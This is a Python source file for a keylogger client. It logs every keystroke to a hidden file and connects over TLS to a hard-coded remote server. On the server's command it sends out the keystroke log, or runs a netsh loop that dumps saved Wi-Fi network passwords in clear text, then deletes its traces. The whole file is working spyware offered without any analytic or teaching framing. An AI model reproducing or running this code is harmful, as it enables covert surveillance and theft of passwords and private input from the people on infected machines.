import socket
import ssl
import os
from pynput.keyboard import Key, Listener
import logging
import platform
import threading
import subprocess

CA_CERTIFICATE = """
-----BEGIN CERTIFICATE-----
MIIFXTCCA0WgAwIBAgIUNWlSm4Rq7K2mgmqsstdlsZjsK+kwDQYJKoZIhvcNAQEL
BQAwPjELMAkGA1UEBhMCRlIxDDAKBgNVBAgMA0RTUTEhMB8GA1UECgwYSW50ZXJu
ZXQgV2lkZ2l0cyBQdHkgTHRkMB4XDTI0MDIyMDA5NTAzOVoXDTI1MDIxOTA5NTAz
OVowPjELMAkGA1UEBhMCRlIxDDAKBgNVBAgMA0RTUTEhMB8GA1UECgwYSW50ZXJu
ZXQgV2lkZ2l0cyBQdHkgTHRkMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKC
AgEA7yBGIafVgLefRL0EsaMCm8JvoJ2Ws4R8rhZRRVIk8sruYsxv654f1mxNLJ3v
8kIvAXHJC9e0p0KDg6eyUt/07MbmyAAjJitdSVpuYUT1f1CIad6kbPv4OkrGOV1j
76Iqme0/id/bm7emPfvzD6ZdEbkFpqPTVy4bzPSizcI2C+B4+vTXoGouP1lpOlgx
aZPV0XYPZV07b5bVvTeOLdchY+oEMQWfpqATj+t2f7YnJ10lNraErofwpbUVWgZv
Cpj8AVLjM95XmiIHl5EFC9uzz1rmuspCaU3sZLpE0dcrp4rzj4BMDcDiQ5aHcsQu
Ixw6htM4IDc1R7nuoIY45HYjaSojD7F+gBCajTE1hJlCloBqGkMevhZbCDQcFv6f
6Ov+FwSZkkyn35RQRty+Dx+/PyJ9LBYuG+Z/5R6DkwatHsJ1PE5EGAkXRYLM3O9Z
BlXyn8DRSCC4HbjfRcjRIh0ZPR62ZKMG62JoTDfcapIcU9HX1JegInqL1aB6/ETC
v9IgCo4Rn1CDgqBjFA2ui1nMP0jMEm/jQUciMCtzk+PU8GbioiRHpQ1Qg6mkMdYA
HtUr+povpnOvfg2d+/e4k3Ckk6UaLe8qls9+DnNSPVIIU+AV81eWOS2wbn9DSwE7
nuXUD+5EqelY+4Uquzu6dasqD2un9AAkV0o8vn/ng7fE++MCAwEAAaNTMFEwHQYD
VR0OBBYEFOPylOLdfNNsgBdHQMFuZ/XZO64aMB8GA1UdIwQYMBaAFOPylOLdfNNs
gBdHQMFuZ/XZO64aMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggIB
AKLKvGBUmOjxWdTxr9vpDFmgvMONB+uOhXslPGWi6/iCpjLj1HqkNZfWMq/yjym7
NzZP28ETAUgwJauaHf1wMtlfqPnvFwZi1zoWc845RR0AFZZNY9f+FMNTu1c/Esi0
DfKG/hdIoxuo+WjGC0zw+nO//XVXW11hZ14mlmdz1xidj7WMpHJv/MXwwPrzq5nZ
ZxA1P5n0pBc8tgoKKXGdB5u0JJfNux3lmi8bm6TwotMdAUcVNLsFrq600QpjWa5a
toielfe6g8yFdzcJAJVJ7K8dwHPFnDy6NQzvaEvC9r93Faxeyi4+TzhsKu9NmtTW
fJICqSgKlRHRgPy+b45aI1Y3lQzx/sTPUszrHDRUrKBMFGxirnAPNAkffGrMl2rY
skjeWL+Y5jo04SugO9iXBmKAdVymJlK4C1K5DSUx1EWC8bLR6cF1RChiUMdt2MdE
xUiD+UPPsPQ3nmI9IFQbWh1JzyZmXq3W9Upj1EfqFUpw/ftDrRD/d3pBCGjoHo0y
DM4TAZztb4aUsiEQgdpCwZHdfchZ4tKUvihIUUVqw8VoUtsUPJHBENjXOJEIpE9b
pjtfl7yl+ckhjy54HCRSndajuSbfFsSoVYH7Ya8e8wXiEIevXm5D5tt7W/D3W9ym
nX+c6Erg9DsNulIa7Ah3iRZpT47eq8sNuarM/6nD3N66
-----END CERTIFICATE-----

"""

def save_command_result(output_file):
    command = 'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear'
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    output, error = process.communicate()
    if error:
        print("An error occurred:", error)
    else:
        with open(output_file, 'w') as f:
            f.write(output)


def check_platform():
    return platform.system()


def find_ca_cert_path():
    for r, d, files in os.walk("c:\\"):
        for filename in files:
            if filename == "ca-cert.pem":
                path = os.path.join(r, filename)
                if path.endswith("SSL\\CA\\ca-cert.pem"):
                    return path
    return None


def os_check():
    current_platform = check_platform()
    if current_platform == 'Windows':
        return 'Windows'
    elif current_platform == 'Linux':
        return 'Linux'
    else:
        return None


def delete_hidden_file(file):
    os.remove(file)


def send_file(conn, filename):
    with open(filename, 'rb') as f:
        while True:
            chunk = f.read(1024)
            if not chunk:
                break
            conn.sendall(chunk)


def key_logger(hidden_file_path, client_ssl, os_local):
    logging.basicConfig(filename=hidden_file_path, level=logging.DEBUG, format="%(asctime)s - %(message)s")
    if os_local == 'windows':
        os.system(f"attrib +h {hidden_file_path}")
    elif os_local == 'linux':
        hidden_file_path = '.' + hidden_file_path

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        server_listener_thread = threading.Thread(target=listen_to_server, args=(client_ssl,))
        server_listener_thread.start()
        server_listener_thread.join()
        listener.stop()
        client_ssl.close()
        logging.shutdown()
        delete_hidden_file(hidden_file_path)
        exit(1)

def listen_to_server(client_ssl):
    while True:
        msg = client_ssl.recv(1024).decode()
        print(f"Server : {msg}")
        if msg == "STOP":
            print("stop")
            send_file(client_ssl, "its_a_trap.txt")
            exit(1)
        if msg == "WIFI":
            output_file = 'result.txt'
            save_command_result(output_file)
            send_file(client_ssl, output_file)
            delete_hidden_file(output_file)


def timeout_handler(client_ssl):
    print("Connection timed out after 10 minutes.")
    client_ssl.close()


def main():
    os_local = os_check()
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(cadata=CA_CERTIFICATE)
    host = '10.49.123.115'  # Replace with the server IP
    port = 10
    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
    client_ssl.connect((host, port))
    print("Client ON")

    while True:
        try:
            key_logger("its_a_trap.txt", client_ssl,os_local)

        except Exception as e:
            print(f"Error: {e}")
            break

        print("-- END --")
        client_ssl.close()


if __name__ == "__main__":
    main()